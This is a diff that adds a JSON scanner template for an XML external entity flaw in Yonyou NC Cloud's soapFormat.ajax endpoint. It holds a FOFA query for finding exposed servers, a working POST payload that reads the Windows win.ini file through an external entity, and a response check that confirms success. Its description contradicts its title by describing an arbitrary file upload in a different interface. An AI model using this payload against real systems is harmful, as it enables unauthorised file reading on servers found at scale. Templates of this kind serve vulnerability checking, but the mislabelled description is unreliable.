@@ -1,0 +1,34 @@
+{
+  "product": "用友NC Cloud",
+  "vul_name": "用友NC Cloud soapFormat.ajax接口存在XXE",
+  "type": "外部实体注入",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "用友 NC Cloud，大型企业数字化平台， 聚焦数字化管理、数字化经营、数字化商业，帮助大型企业实现 人、财、物、客的全面数字化，从而驱动业务创新与管理变革，与企业管理者一起重新定义未来的高度。为客户提供面向大型企业集团、制造业、消费品、建筑、房地产、金融保险等14个行业大类，68个细分行业，涵盖数字营销、智能制造、财务共享、数字采购等18大解决方案，帮助企业全面落地数字化。用友NC Cloud uploadChunk接口存在任意文件上传漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "body=\"/Client/Uclient/UClient.exe\"||body=\"ufida.ico\"||body=\"nccloud\"||body=\"/api/uclient/public/\""
+  },
+  "protocol": "http",
+  "link": "https://blog.csdn.net/weixin_62352348/article/details/135566117",
+  "fix": [],
+  "exploit": {
+    "exp": {
+      "method": "post",
+      "follow": false,
+      "path": "/uapws/soapFormat.ajax",
+      "data": "msg=<!DOCTYPE foo[<!ENTITY xxe1two SYSTEM \"file:///C://windows/win.ini\"> ]><soap:Envelope xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap:Body><soap:Fault><faultcode>soap:Server%26xxe1two%3b</faultcode></soap:Fault></soap:Body></soap:Envelope>%0a"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "for 16-bit app support"
+        }
+      ]
+    }
+  }
+}
